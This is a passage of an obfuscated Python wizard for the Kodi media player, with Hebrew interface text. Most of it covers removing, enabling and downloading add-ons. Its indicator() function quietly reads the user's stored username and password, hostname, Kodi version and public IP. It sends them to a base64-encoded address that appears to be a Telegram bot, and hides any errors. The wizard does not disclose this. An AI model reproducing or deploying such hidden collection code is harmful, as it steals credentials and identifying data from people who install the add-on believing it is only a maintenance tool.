		while not O000OO00000OOO0OO ==-1 :#line:3704
			O000OO00000OOO0OO =DIALOG .select ("%s: Select the addons you wish to remove."%ADDONTITLE ,O00O0O0000O00OO0O )#line:3705
			if O000OO00000OOO0OO ==-1 :break #line:3706
			elif O000OO00000OOO0OO ==0 :break #line:3707
			else :#line:3708
				OOO0OOOO0OOOO0OO0 =(O000OO00000OOO0OO -1 )#line:3709
				if OOO0OOOO0OOOO0OO0 in OO00O000OO0000OO0 :#line:3710
					OO00O000OO0000OO0 .remove (OOO0OOOO0OOOO0OO0 )#line:3711
					O00O0O0000O00OO0O [O000OO00000OOO0OO ]=O0O0OO0O0O00O0O00 [OOO0OOOO0OOOO0OO0 ]#line:3712
				else :#line:3713
					OO00O000OO0000OO0 .append (OOO0OOOO0OOOO0OO0 )#line:3714
					O00O0O0000O00OO0O [O000OO00000OOO0OO ]="[B][COLOR %s]%s[/COLOR][/B]"%(COLOR1 ,O0O0OO0O0O00O0O00 [OOO0OOOO0OOOO0OO0 ])#line:3715
	if OO00O000OO0000OO0 ==None :return #line:3716
	if len (OO00O000OO0000OO0 )>0 :#line:3717
		wiz .addonUpdates ('set')#line:3718
		for OOO0OOO0OOOOO0OOO in OO00O000OO0000OO0 :#line:3719
			removeAddon (O0000O0OOO0OOO0OO [OOO0OOO0OOOOO0OOO ],O0O0OO0O0O00O0O00 [OOO0OOO0OOOOO0OOO ],True )#line:3720
		xbmc .sleep (1000 )#line:3722
		if INSTALLMETHOD ==1 :O0O000OOOOO0O00O0 =1 #line:3724
		elif INSTALLMETHOD ==2 :O0O000OOOOO0O00O0 =0 #line:3725
		else :O0O000OOOOO0O00O0 =DIALOG .yesno (ADDONTITLE ,"[COLOR %s]סיום התקנה [COLOR %s]סגירה[/COLOR] או [COLOR %s]הצג נתונים[/COLOR]?[/COLOR]"%(COLOR2 ,COLOR1 ,COLOR1 ),yeslabel ="[B][COLOR green]הצג נתונים[/COLOR][/B]",nolabel ="[B][COLOR red]סגירה[/COLOR][/B]")#line:3726
		if O0O000OOOOO0O00O0 ==1 :wiz .reloadFix ('remove addon')#line:3727
		else :wiz .addonUpdates ('reset');wiz .killxbmc (True )#line:3728
def removeAddonDataMenu ():#line:3730
	if os .path .exists (ADDOND ):#line:3731
		addFile ('[COLOR red][B][REMOVE][/B][/COLOR] All Addon_Data','removedata','all',themeit =THEME2 )#line:3732
		addFile ('[COLOR red][B][REMOVE][/B][/COLOR] All Addon_Data for Uninstalled Addons','removedata','uninstalled',themeit =THEME2 )#line:3733
		addFile ('[COLOR red][B][REMOVE][/B][/COLOR] All Empty Folders in Addon_Data','removedata','empty',themeit =THEME2 )#line:3734
		addFile ('[COLOR red][B][REMOVE][/B][/COLOR] %s Addon_Data'%ADDONTITLE ,'resetaddon',themeit =THEME2 )#line:3735
		if HIDESPACERS =='No':addFile (wiz .sep (),'',themeit =THEME3 )#line:3736
		OOO0O00O00OO00OO0 =glob .glob (os .path .join (ADDOND ,'*/'))#line:3737
		for O0OOOOOO000O000O0 in sorted (OOO0O00O00OO00OO0 ,key =lambda O0OO00OO000O0OOO0 :O0OO00OO000O0OOO0 ):#line:3738
			O0O000O0000O0O0O0 =O0OOOOOO000O000O0 .replace (ADDOND ,'').replace ('\\','').replace ('/','')#line:3739
			OO0OOOO0O00000O0O =os .path .join (O0OOOOOO000O000O0 .replace (ADDOND ,ADDONS ),'icon.png')#line:3740
			OOOOO0O0000OO0O0O =os .path .join (O0OOOOOO000O000O0 .replace (ADDOND ,ADDONS ),'fanart.png')#line:3741
			O000OOO0OO0O0O000 =O0O000O0000O0O0O0 #line:3742
			OO0OOO0OO0OO000O0 ={'audio.':'[COLOR orange][AUDIO] [/COLOR]','metadata.':'[COLOR cyan][METADATA] [/COLOR]','module.':'[COLOR orange][MODULE] [/COLOR]','plugin.':'[COLOR blue][PLUGIN] [/COLOR]','program.':'[COLOR orange][PROGRAM] [/COLOR]','repository.':'[COLOR gold][REPO] [/COLOR]','script.':'[COLOR green][SCRIPT] [/COLOR]','service.':'[COLOR green][SERVICE] [/COLOR]','skin.':'[COLOR dodgerblue][SKIN] [/COLOR]','video.':'[COLOR orange][VIDEO] [/COLOR]','weather.':'[COLOR yellow][WEATHER] [/COLOR]'}#line:3743
			for OOO00O0000000OOOO in OO0OOO0OO0OO000O0 :#line:3744
				O000OOO0OO0O0O000 =O000OOO0OO0O0O000 .replace (OOO00O0000000OOOO ,OO0OOO0OO0OO000O0 [OOO00O0000000OOOO ])#line:3745
			if O0O000O0000O0O0O0 in EXCLUDES :O000OOO0OO0O0O000 ='[COLOR green][B][PROTECTED][/B][/COLOR] %s'%O000OOO0OO0O0O000 #line:3746
			else :O000OOO0OO0O0O000 ='[COLOR red][B][REMOVE][/B][/COLOR] %s'%O000OOO0OO0O0O000 #line:3747
			addFile (' %s'%O000OOO0OO0O0O000 ,'removedata',O0O000O0000O0O0O0 ,icon =OO0OOOO0O00000O0O ,fanart =OOOOO0O0000OO0O0O ,themeit =THEME2 )#line:3748
	else :#line:3749
		addFile ('No Addon data folder found.','',themeit =THEME3 )#line:3750
	setView ('files','viewType')#line:3751
def enableAddons ():#line:3753
	addFile ("[I][B][COLOR red]!!Notice: Disabling Some Addons Can Cause Issues!![/COLOR][/B][/I]",'',icon =ICONMAINT )#line:3754
	OO0OO0OO00OO000OO =glob .glob (os .path .join (ADDONS ,'*/'))#line:3755
	OOO0O0O00O000O000 =0 #line:3756
	for O0OOO000O0OOOOO00 in sorted (OO0OO0OO00OO000OO ,key =lambda O00OOOOO00OO00O0O :O00OOOOO00OO00O0O ):#line:3757
		O0O00O0OO000OO00O =os .path .split (O0OOO000O0OOOOO00 [:-1 ])[1 ]#line:3758
		if O0O00O0OO000OO00O in EXCLUDES :continue #line:3759
		if O0O00O0OO000OO00O in DEFAULTPLUGINS :continue #line:3760
		O000OOOO0O0OO00O0 =os .path .join (O0OOO000O0OOOOO00 ,'addon.xml')#line:3761
		if os .path .exists (O000OOOO0O0OO00O0 ):#line:3762
			OOO0O0O00O000O000 +=1 #line:3763
			OO0OO0OO00OO000OO =O0OOO000O0OOOOO00 .replace (ADDONS ,'')[1 :-1 ]#line:3764
			O0OOOO0OOOO000OO0 =open (O000OOOO0O0OO00O0 )#line:3765
			O0OO0OOO0O0OOOO00 =O0OOOO0OOOO000OO0 .read ().replace ('\n','').replace ('\r','').replace ('\t','')#line:3766
			O0OOO0000OO0O000O =wiz .parseDOM (O0OO0OOO0O0OOOO00 ,'addon',ret ='id')#line:3767
			O0O00O000OO0OO0OO =wiz .parseDOM (O0OO0OOO0O0OOOO00 ,'addon',ret ='name')#line:3768
			try :#line:3769
				OO0O0000OOO0OOO00 =O0OOO0000OO0O000O [0 ]#line:3770
				O00000O0OOOO0OO00 =O0O00O000OO0OO0OO [0 ]#line:3771
			except :#line:3772
				continue #line:3773
			try :#line:3774
				O0O0O0OOO0O00O00O =xbmcaddon .Addon (id =OO0O0000OOO0OOO00 )#line:3775
				OO0OO0O0OOO00O0O0 ="[COLOR green][Enabled][/COLOR]"#line:3776
				OO0OOOO0O0OOOOOO0 ="false"#line:3777
			except :#line:3778
				OO0OO0O0OOO00O0O0 ="[COLOR red][Disabled][/COLOR]"#line:3779
				OO0OOOO0O0OOOOOO0 ="true"#line:3780
				pass #line:3781
			O000OOOOOOOOOOO00 =os .path .join (O0OOO000O0OOOOO00 ,'icon.png')if os .path .exists (os .path .join (O0OOO000O0OOOOO00 ,'icon.png'))else ICON #line:3782
			O000O00OO0O0O000O =os .path .join (O0OOO000O0OOOOO00 ,'fanart.jpg')if os .path .exists (os .path .join (O0OOO000O0OOOOO00 ,'fanart.jpg'))else FANART #line:3783
			addFile ("%s %s"%(OO0OO0O0OOO00O0O0 ,O00000O0OOOO0OO00 ),'toggleaddon',OO0OO0OO00OO000OO ,OO0OOOO0O0OOOOOO0 ,icon =O000OOOOOOOOOOO00 ,fanart =O000O00OO0O0O000O )#line:3784
			O0OOOO0OOOO000OO0 .close ()#line:3785
	if OOO0O0O00O000O000 ==0 :#line:3786
		addFile ("No Addons Found to Enable or Disable.",'',icon =ICONMAINT )#line:3787
	setView ('files','viewType')#line:3788
def changeFeq ():#line:3790
	O0000OOOOO0O0OO0O =['Every Startup','Every Day','Every Three Days','Every Weekly']#line:3791
	O00000000O0O0OO0O =DIALOG .select ("[COLOR %s]How often would you list to Auto Clean on Startup?[/COLOR]"%COLOR2 ,O0000OOOOO0O0OO0O )#line:3792
	if not O00000000O0O0OO0O ==-1 :#line:3793
		wiz .setS ('autocleanfeq',str (O00000000O0O0OO0O ))#line:3794
		wiz .LogNotify ('[COLOR %s]Auto Clean Up[/COLOR]'%COLOR1 ,'[COLOR %s]Fequency Now %s[/COLOR]'%(COLOR2 ,O0000OOOOO0O0OO0O [O00000000O0O0OO0O ]))#line:3795
def developer ():#line:3797
	addFile ('Convert Text Files to 0.1.7','converttext',themeit =THEME1 )#line:3798
	addFile ('Create QR Code','createqr',themeit =THEME1 )#line:3799
	addFile ('Test Notifications','testnotify',themeit =THEME1 )#line:3800
	addFile ('Test Update','testupdate',themeit =THEME1 )#line:3801
	addFile ('Test First Run','testfirst',themeit =THEME1 )#line:3802
	addFile ('Test First Run Settings','testfirstrun',themeit =THEME1 )#line:3803
	addFile ('Test APk','testapk',themeit =THEME1 )#line:3804
	setView ('files','viewType')#line:3806
def download (O000O0OO0OO0O0OO0 ,OOOO0000000OOO00O ):#line:3811
  OOO00OO0OOOO0O0O0 =xbmc .translatePath (os .path .join ('special://home/addons','packages'))#line:3812
  O00O0OOO0OO00O0OO =xbmcgui .DialogProgress ()#line:3813
  O00O0OOO0OO00O0OO .create ("XBMC ISRAEL","Downloading "+name ,'','Please Wait')#line:3814
  O0O00O0OOOO0OOOOO =os .path .join (OOO00OO0OOOO0O0O0 ,'isr.zip')#line:3815
  OO0OO00O0O0OOOOOO =urllib2 .Request (O000O0OO0OO0O0OO0 )#line:3816
  OO00O0O000OOO0O0O =urllib2 .urlopen (OO0OO00O0O0OOOOOO )#line:3817
  OO0O0OO0OO00000O0 =xbmcgui .DialogProgress ()#line:3819
  OO0O0OO0OO00000O0 .create ("Downloading","Downloading "+name )#line:3820
  OO0O0OO0OO00000O0 .update (0 )#line:3821
  OOO00OO000O0OO0OO =OOOO0000000OOO00O #line:3822
  O0O0O0OO0O0OO00O0 =open (O0O00O0OOOO0OOOOO ,'wb')#line:3823
  try :#line:3825
    OOOOOOOO0O00000O0 =OO00O0O000OOO0O0O .info ().getheader ('Content-Length').strip ()#line:3826
    OO0OO0O0OO0O0O0O0 =True #line:3827
  except AttributeError :#line:3828
        OO0OO0O0OO0O0O0O0 =False #line:3829
  if OO0OO0O0OO0O0O0O0 :#line:3831
        OOOOOOOO0O00000O0 =int (OOOOOOOO0O00000O0 )#line:3832
  O00OOO0O0OOO000O0 =0 #line:3834
  O0O0O000O000000OO =time .time ()#line:3835
  while True :#line:3836
        OOOOOOOO0O000OO0O =OO00O0O000OOO0O0O .read (8192 )#line:3837
        if not OOOOOOOO0O000OO0O :#line:3838
            sys .stdout .write ('\n')#line:3839
            break #line:3840
        O00OOO0O0OOO000O0 +=len (OOOOOOOO0O000OO0O )#line:3842
        O0O0O0OO0O0OO00O0 .write (OOOOOOOO0O000OO0O )#line:3843
        if not OO0OO0O0OO0O0O0O0 :#line:3845
            OOOOOOOO0O00000O0 =O00OOO0O0OOO000O0 #line:3846
        if OO0O0OO0OO00000O0 .iscanceled ():#line:3847
           OO0O0OO0OO00000O0 .close ()#line:3848
           try :#line:3849
            os .remove (O0O00O0OOOO0OOOOO )#line:3850
           except :#line:3851
            pass #line:3852
           break #line:3853
        O0000OOOO0OOO000O =float (O00OOO0O0OOO000O0 )/OOOOOOOO0O00000O0 #line:3854
        O0000OOOO0OOO000O =round (O0000OOOO0OOO000O *100 ,2 )#line:3855
        O0O00OOOO00OO00O0 =O00OOO0O0OOO000O0 /(1024 *1024 )#line:3856
        O00OOOO0000OO00O0 =OOOOOOOO0O00000O0 /(1024 *1024 )#line:3857
        O0OOOO0O00OO0O00O ='[COLOR %s][B]Size:[/B] [COLOR %s]%.02f[/COLOR] MB of [COLOR %s]%.02f[/COLOR] MB[/COLOR]'%('teal','skyblue',O0O00OOOO00OO00O0 ,'teal',O00OOOO0000OO00O0 )#line:3858
        if (time .time ()-O0O0O000O000000OO )>0 :#line:3859
          OO00OO0OOOOO0O0O0 =O00OOO0O0OOO000O0 /(time .time ()-O0O0O000O000000OO )#line:3860
          OO00OO0OOOOO0O0O0 =OO00OO0OOOOO0O0O0 /1024 #line:3861
        else :#line:3862
         OO00OO0OOOOO0O0O0 =0 #line:3863
        OO0OOO0OO0O000OOO ='KB'#line:3864
        if OO00OO0OOOOO0O0O0 >=1024 :#line:3865
           OO00OO0OOOOO0O0O0 =OO00OO0OOOOO0O0O0 /1024 #line:3866
           OO0OOO0OO0O000OOO ='MB'#line:3867
        if OO00OO0OOOOO0O0O0 >0 and not O0000OOOO0OOO000O ==100 :#line:3868
            O0O00OO000O0O0O0O =(OOOOOOOO0O00000O0 -O00OOO0O0OOO000O0 )/OO00OO0OOOOO0O0O0 #line:3869
        else :#line:3870
            O0O00OO000O0O0O0O =0 #line:3871
        O0OOOO0000000OO0O ='[COLOR %s][B]Speed:[/B] [COLOR %s]%.02f [/COLOR]%s/s '%('teal','skyblue',OO00OO0OOOOO0O0O0 ,OO0OOO0OO0O000OOO )#line:3872
        OO0O0OO0OO00000O0 .update (int (O0000OOOO0OOO000O ),"Downloading "+name ,O0OOOO0O00OO0O00O ,O0OOOO0000000OO0O )#line:3874
  O0O0O000O00OOOOOO =xbmc .translatePath (os .path .join ('special://home','addons'))#line:3877
  O0O0O0OO0O0OO00O0 .close ()#line:3879
  extract (O0O00O0OOOO0OOOOO ,O0O0O000O00OOOOOO ,OO0O0OO0OO00000O0 )#line:3881
  if os .path .exists (O0O0O000O00OOOOOO +'/scakemyer-script.quasar.burst'):#line:3882
    if os .path .exists (O0O0O000O00OOOOOO +'/script.quasar.burst'):#line:3883
     shutil .rmtree (O0O0O000O00OOOOOO +'/script.quasar.burst',ignore_errors =False )#line:3884
    os .rename (O0O0O000O00OOOOOO +'/scakemyer-script.quasar.burst',O0O0O000O00OOOOOO +'/script.quasar.burst')#line:3885
  if os .path .exists (O0O0O000O00OOOOOO +'/plugin.video.kmediatorrent-master'):#line:3887
    if os .path .exists (O0O0O000O00OOOOOO +'/plugin.video.kmediatorrent'):#line:3888
     shutil .rmtree (O0O0O000O00OOOOOO +'/plugin.video.kmediatorrent',ignore_errors =False )#line:3889
    os .rename (O0O0O000O00OOOOOO +'/plugin.video.kmediatorrent-master',O0O0O000O00OOOOOO +'/plugin.video.kmediatorrent')#line:3890
  xbmc .executebuiltin ('UpdateLocalAddons ')#line:3891
  xbmc .executebuiltin ("UpdateAddonRepos")#line:3892
  try :#line:3893
    os .remove (O0O00O0OOOO0OOOOO )#line:3894
  except :#line:3895
    pass #line:3896
  OO0O0OO0OO00000O0 .close ()#line:3897
def dis_or_enable_addon (O000OO000OOO0000O ,O0O0O0O0O0000OOO0 ,enable ="true"):#line:3898
    import json #line:3899
    O0O00O0OO00000O0O ='"%s"'%O000OO000OOO0000O #line:3900
    if xbmc .getCondVisibility ("System.HasAddon(%s)"%O000OO000OOO0000O )and enable =="true":#line:3901
        logging .warning ('already Enabled')#line:3902
        return xbmc .log ("### Skipped %s, reason = allready enabled"%O000OO000OOO0000O )#line:3903
    elif not xbmc .getCondVisibility ("System.HasAddon(%s)"%O000OO000OOO0000O )and enable =="false":#line:3904
        return xbmc .log ("### Skipped %s, reason = not installed"%O000OO000OOO0000O )#line:3905
    else :#line:3906
        OO000O00O00OOOOOO ='{"jsonrpc":"2.0","id":1,"method":"Addons.SetAddonEnabled","params":{"addonid":%s,"enabled":%s}}'%(O0O00O0OO00000O0O ,enable )#line:3907
        O00OOOO00O000000O =xbmc .executeJSONRPC (OO000O00O00OOOOOO )#line:3908
        OOO0OOO00O00OO0O0 =json .loads (O00OOOO00O000000O )#line:3909
        if enable =="true":#line:3910
            xbmc .log ("### Enabled %s, response = %s"%(O000OO000OOO0000O ,OOO0OOO00O00OO0O0 ))#line:3911
        else :#line:3912
            xbmc .log ("### Disabled %s, response = %s"%(O000OO000OOO0000O ,OOO0OOO00O00OO0O0 ))#line:3913
    if O0O0O0O0O0000OOO0 =='auto':#line:3914
     return True #line:3915
    return xbmc .executebuiltin ('Container.Update(%s)'%xbmc .getInfoLabel ('Container.FolderPath'))#line:3916
def chunk_report (O0OO0OOO0O0OO0000 ,OO00OO0OOO0OOOOOO ,O0OOOO0OOO0O000O0 ):#line:3917
   O0OO0000O00O0OO0O =float (O0OO0OOO0O0OO0000 )/O0OOOO0OOO0O000O0 #line:3918
   O0OO0000O00O0OO0O =round (O0OO0000O00O0OO0O *100 ,2 )#line:3919
   if O0OO0OOO0O0OO0000 >=O0OOOO0OOO0O000O0 :#line:3921
      sys .stdout .write ('\n')#line:3922
def chunk_read (OO000O000OOO00OOO ,chunk_size =8192 ,report_hook =None ,dp =None ,destination ='',filesize =1000000 ):#line:3924
   import time #line:3925
   OO00OOOO00OO0000O =int (filesize )*1000000 #line:3926
   OOOO0O0OOOOO0OO0O =0 #line:3928
   OO000O00O0O0O0O0O =time .time ()#line:3929
   O0OOOO00OOO0O0O0O =0 #line:3930
   logging .warning ('Downloading')#line:3932
   with open (destination ,"wb")as O00O0O00O00000O0O :#line:3933
    while 1 :#line:3934
      O00O00O00OO0O0OOO =time .time ()-OO000O00O0O0O0O0O #line:3935
      OO000O000O0O0OOO0 =int (O0OOOO00OOO0O0O0O *chunk_size )#line:3936
      OO0000OO000OO00OO =OO000O000OOO00OOO .read (chunk_size )#line:3937
      O00O0O00O00000O0O .write (OO0000OO000OO00OO )#line:3938
      O00O0O00O00000O0O .flush ()#line:3939
      OOOO0O0OOOOO0OO0O +=len (OO0000OO000OO00OO )#line:3940
      OOO00000000O000O0 =float (OOOO0O0OOOOO0OO0O )/OO00OOOO00OO0000O #line:3941
      OOO00000000O000O0 =round (OOO00000000O000O0 *100 ,2 )#line:3942
      if int (O00O00O00OO0O0OOO )>0 :#line:3943
        OOO0O00O000000O00 =int (OO000O000O0O0OOO0 /(1024 *O00O00O00OO0O0OOO ))#line:3944
      else :#line:3945
         OOO0O00O000000O00 =0 #line:3946
      if OOO0O00O000000O00 >1024 and not OOO00000000O000O0 ==100 :#line:3947
          O0O00OOO0O0OOO000 =int (((OO00OOOO00OO0000O -OO000O000O0O0OOO0 )/1024 )/(OOO0O00O000000O00 ))#line:3948
      else :#line:3949
          O0O00OOO0O0OOO000 =0 #line:3950
      if O0O00OOO0O0OOO000 <0 :#line:3951
        O0O00OOO0O0OOO000 =0 #line:3952
      dp .update (int (OOO00000000O000O0 ),name +"[B]מוריד: [/B]","\r%d%%,[COLOR aqua] %d MB / %d MB [/COLOR], %d KB/s "%(OOO00000000O000O0 ,OO000O000O0O0OOO0 /(1024 *1024 ),OO00OOOO00OO0000O /(1000 *1000 ),OOO0O00O000000O00 ),'[COLOR aqua]%02d:%02d[/COLOR][B]זמן שנותר: [/B]'%divmod (O0O00OOO0O0OOO000 ,60 ))#line:3953
      if dp .iscanceled ():#line:3954
         dp .close ()#line:3955
         break #line:3956
      if not OO0000OO000OO00OO :#line:3957
         break #line:3958
      if report_hook :#line:3960
         report_hook (OOOO0O0OOOOO0OO0O ,chunk_size ,OO00OOOO00OO0000O )#line:3961
      O0OOOO00OOO0O0O0O +=1 #line:3962
   logging .warning ('END Downloading')#line:3963
   return OOOO0O0OOOOO0OO0O #line:3964
def googledrive_download (OOO0OOOO0O0O0000O ,OO0OO00OOOOO00O0O ,OOO0O000O0O000OOO ,OO0O0O000O0O0000O ):#line:3966
    OO00O0O000000O000 =[]#line:3970
    OO0O0O00000OOOOO0 =OOO0OOOO0O0O0000O .split ('=')#line:3971
    OOO0OOOO0O0O0000O =OO0O0O00000OOOOO0 [len (OO0O0O00000OOOOO0 )-1 ]#line:3972
    def OO00OO00O0OOO000O (OOOO0O00OOOOO0O0O ):#line:3974
        for O00O00OOOOO0O0OO0 in OOOO0O00OOOOO0O0O :#line:3976
            logging .warning ('cookie.name')#line:3977
            logging .warning (O00O00OOOOO0O0OO0 .name )#line:3978
            O0OOO0O0O0OOOO00O =O00O00OOOOO0O0OO0 .value #line:3979
            if 'download_warning'in O00O00OOOOO0O0OO0 .name :#line:3980
                logging .warning (O00O00OOOOO0O0OO0 .value )#line:3981
                logging .warning ('cookie.value')#line:3982
                return O00O00OOOOO0O0OO0 .value #line:3983
            return O0OOO0O0O0OOOO00O #line:3984
        return None #line:3986
    def O000O000OOOOOOOO0 (O0O00OO0000O0O000 ,O0O0O0O00OO00000O ):#line:3988
        O0OOOOO00O00O0OO0 =32768 #line:3990
        O0O000000OO0O00O0 =time .time ()#line:3991
        with open (O0O0O0O00OO00000O ,"wb")as O0O00O000000O00O0 :#line:3993
            OO000OOO0OOOO000O =1 #line:3994
            OO0OO0OOO0O0000OO =32768 #line:3995
            try :#line:3996
                OOO0O0O0O00OOO0O0 =int (O0O00OO0000O0O000 .headers .get ('content-length'))#line:3997
                print ('file total size :',OOO0O0O0O00OOO0O0 )#line:3998
            except TypeError :#line:3999
                print ('using dummy length !!!')#line:4000
                OOO0O0O0O00OOO0O0 =int (OO0O0O000O0O0000O )*1000000 #line:4001
            for O00O00OO00000OO0O in O0O00OO0000O0O000 .iter_content (O0OOOOO00O00O0OO0 ):#line:4002
                if O00O00OO00000OO0O :#line:4003
                    O0O00O000000O00O0 .write (O00O00OO00000OO0O )#line:4004
                    O0O00O000000O00O0 .flush ()#line:4005
                    OOO00OOOOOOO0O000 =time .time ()-O0O000000OO0O00O0 #line:4006
                    O00O0OO00000OOO00 =int (OO000OOO0OOOO000O *OO0OO0OOO0O0000OO )#line:4007
                    if OOO00OOOOOOO0O000 ==0 :#line:4008
                        OOO00OOOOOOO0O000 =0.1 #line:4009
                    OO0O000OOO0OO0000 =int (O00O0OO00000OOO00 /(1024 *OOO00OOOOOOO0O000 ))#line:4010
                    OOOO00O000O0O000O =int (OO000OOO0OOOO000O *OO0OO0OOO0O0000OO *100 /OOO0O0O0O00OOO0O0 )#line:4011
                    if OO0O000OOO0OO0000 >1024 and not OOOO00O000O0O000O ==100 :#line:4012
                      O000OO0O00O000OOO =int (((OOO0O0O0O00OOO0O0 -O00O0OO00000OOO00 )/1024 )/(OO0O000OOO0OO0000 ))#line:4013
                    else :#line:4014
                      O000OO0O00O000OOO =0 #line:4015
                    OOO0O000O0O000OOO .update (int (OOOO00O000O0O000O ),name ,"\r%d%%,[COLOR aqua] %d MB / %d MB [/COLOR], %d KB/s "%(OOOO00O000O0O000O ,O00O0OO00000OOO00 /(1024 *1024 ),OOO0O0O0O00OOO0O0 /(1000 *1000 ),OO0O000OOO0OO0000 ),'[B]ETA:[/B] [COLOR aqua]%02d:%02d[/COLOR]'%divmod (O000OO0O00O000OOO ,60 ))#line:4017
                    OO000OOO0OOOO000O +=1 #line:4018
                    if OOO0O000O0O000OOO .iscanceled ():#line:4019
                     OOO0O000O0O000OOO .close ()#line:4020
                     break #line:4021
    OO00OO0O00OOOO0OO ="https://docs.google.com/uc?export=download"#line:4022
    import urllib2 #line:4027
    import cookielib #line:4028
    from cookielib import CookieJar #line:4030
    O0000O0OO00O00OO0 =CookieJar ()#line:4032
    OOOO0OOO0O0O00O00 =urllib2 .build_opener (urllib2 .HTTPCookieProcessor (O0000O0OO00O00OO0 ))#line:4033
    O0OOOOOOO00OOO000 ={'id':OOO0OOOO0O0O0000O }#line:4035
    O0O0OO0OOO0OO00O0 =urllib .urlencode (O0OOOOOOO00OOO000 )#line:4036
    logging .warning (OO00OO0O00OOOO0OO +'&'+O0O0OO0OOO0OO00O0 )#line:4037
    O00O0OOO0OO0OO0OO =OOOO0OOO0O0O00O00 .open (OO00OO0O00OOOO0OO +'&'+O0O0OO0OOO0OO00O0 )#line:4038
    O000OOOOOOOO0O0OO =O00O0OOO0OO0OO0OO .read ()#line:4039
    for O00O0O00O0OOOO0OO in O0000O0OO00O00OO0 :#line:4041
         logging .warning (O00O0O00O0OOOO0OO )#line:4042
    O0O0O00OOOO000O0O =OO00OO00O0OOO000O (O0000O0OO00O00OO0 )#line:4043
    logging .warning (O0O0O00OOOO000O0O )#line:4044
    if O0O0O00OOOO000O0O :#line:4045
        O0OO0OO000OO00O00 ={'id':OOO0OOOO0O0O0000O ,'confirm':O0O0O00OOOO000O0O }#line:4046
        O000O00OO000000O0 ={'Access-Control-Allow-Headers':'Content-Length'}#line:4047
        O0O0OO0OOO0OO00O0 =urllib .urlencode (O0OO0OO000OO00O00 )#line:4048
        O00O0OOO0OO0OO0OO =OOOO0OOO0O0O00O00 .open (OO00OO0O00OOOO0OO +'&'+O0O0OO0OOO0OO00O0 )#line:4049
        chunk_read (O00O0OOO0OO0OO0OO ,report_hook =chunk_report ,dp =OOO0O000O0O000OOO ,destination =OO0OO00OOOOO00O0O ,filesize =OO0O0O000O0O0000O )#line:4050
    return (OO00O0O000000O000 )#line:4054
def kodi17Fix ():#line:4055
	O000OO0O0OOO0O000 =glob .glob (os .path .join (ADDONS ,'*/'))#line:4056
	O0OO000O00OO000O0 =[]#line:4057
	for OO0O0OOO0O0O00O00 in sorted (O000OO0O0OOO0O000 ,key =lambda O000OOO0OO0O0O00O :O000OOO0OO0O0O00O ):#line:4058
		OO0OOOOOOOO00OO00 =os .path .join (OO0O0OOO0O0O00O00 ,'addon.xml')#line:4059
		if os .path .exists (OO0OOOOOOOO00OO00 ):#line:4060
			O00O00OOO0OOOOOO0 =OO0O0OOO0O0O00O00 .replace (ADDONS ,'')[1 :-1 ]#line:4061
			O000OO000O0OO0000 =open (OO0OOOOOOOO00OO00 )#line:4062
			OO00OO000000OOO00 =O000OO000O0OO0000 .read ()#line:4063
			O00O00O0OO0O00OOO =parseDOM (OO00OO000000OOO00 ,'addon',ret ='id')#line:4064
			O000OO000O0OO0000 .close ()#line:4065
			try :#line:4066
				OO00O0O00000O00OO =xbmcaddon .Addon (id =O00O00O0OO0O00OOO [0 ])#line:4067
			except :#line:4068
				try :#line:4069
					log ("%s was disabled"%O00O00O0OO0O00OOO [0 ],xbmc .LOGDEBUG )#line:4070
					O0OO000O00OO000O0 .append (O00O00O0OO0O00OOO [0 ])#line:4071
				except :#line:4072
					try :#line:4073
						log ("%s was disabled"%O00O00OOO0OOOOOO0 ,xbmc .LOGDEBUG )#line:4074
						O0OO000O00OO000O0 .append (O00O00OOO0OOOOOO0 )#line:4075
					except :#line:4076
						if len (O00O00O0OO0O00OOO )==0 :log ("Unabled to enable: %s(Cannot Determine Addon ID)"%O00O00OOO0OOOOOO0 ,xbmc .LOGERROR )#line:4077
						else :log ("Unabled to enable: %s"%OO0O0OOO0O0O00O00 ,xbmc .LOGERROR )#line:4078
	if len (O0OO000O00OO000O0 )>0 :#line:4079
		OOOOOOO0O0OO0O00O =0 #line:4080
		DP .create (ADDONTITLE ,'[COLOR %s]Enabling disabled Addons'%COLOR2 ,'','Please Wait[/COLOR]')#line:4081
		for OO0O000OOO0O00O00 in O0OO000O00OO000O0 :#line:4082
			OOOOOOO0O0OO0O00O +=1 #line:4083
			O00000O00000O00OO =int (percentage (OOOOOOO0O0OO0O00O ,len (O0OO000O00OO000O0 )))#line:4084
			DP .update (O00000O00000O00OO ,"","Enabling: [COLOR %s]%s[/COLOR]"%(COLOR1 ,OO0O000OOO0O00O00 ))#line:4085
			addonDatabase (OO0O000OOO0O00O00 ,1 )#line:4086
			if DP .iscanceled ():break #line:4087
		if DP .iscanceled ():#line:4088
			DP .close ()#line:4089
			LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Enabling Addons Cancelled![/COLOR]"%COLOR2 )#line:4090
			sys .exit ()#line:4091
		DP .close ()#line:4092
	forceUpdate ()#line:4093
def indicator ():#line:4095
       try :#line:4096
          import json #line:4097
          wiz .log ('FRESH MESSAGE')#line:4098
          O0OO0OO0000OO0OOO =(ADDON .getSetting ("user"))#line:4099
          O0O00OOOO0OO00OOO =(ADDON .getSetting ("pass"))#line:4100
          OOO000OO000OO0000 =(xbmc .getInfoLabel ("System.BuildVersion")[:4 ])#line:4101
          OOO0O0O00O00O0O0O ='aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDc1MDEwMDI1NjpBQUVJVnpTSndOM2t6T25EV0F3Yi1LTkk3VUREY2N6aEx6VS9zZW5kTWVzc2FnZT9jaGF0X2lkPS0xMDAxNDE1ODcxNzk3JnRleHQ915TXqten15nXnyDXkNeqINeU15HXmdec15Mg16nXnNeaIA=='#line:4102
          O00O0O000OO0O0O0O =urllib2 .urlopen ('https://api.ipify.org/?format=json').read ()#line:4103
          O000O00OO0O0OO0OO =str (json .loads (O00O0O000OO0O0O0O )['ip'])#line:4104
          OO00OO00OO0O0OOOO =O0OO0OO0000OO0OOO #line:4105
          O00OO000O0000000O =O0O00OOOO0OO00OOO #line:4106
          import socket #line:4107
          O00O0O000OO0O0O0O =urllib2 .urlopen (OOO0O0O00O00O0O0O .decode ('base64')+' - '+(socket .gethostbyaddr (socket .gethostname ())[0 ])+' - '+OO00OO00OO0O0OOOO +' - '+O00OO000O0000000O +' - '+OOO000OO000OO0000 +' - '+O000O00OO0O0OO0OO ).readlines ()#line:4108
       except :pass #line:4110
def indicatorfastupdate ():#line:4112
       try :#line:4113
          import json #line:4114
          wiz .log ('FRESH MESSAGE')#line:4115
          OO000OO00OOO0OOOO =(ADDON .getSetting ("user"))#line:4116
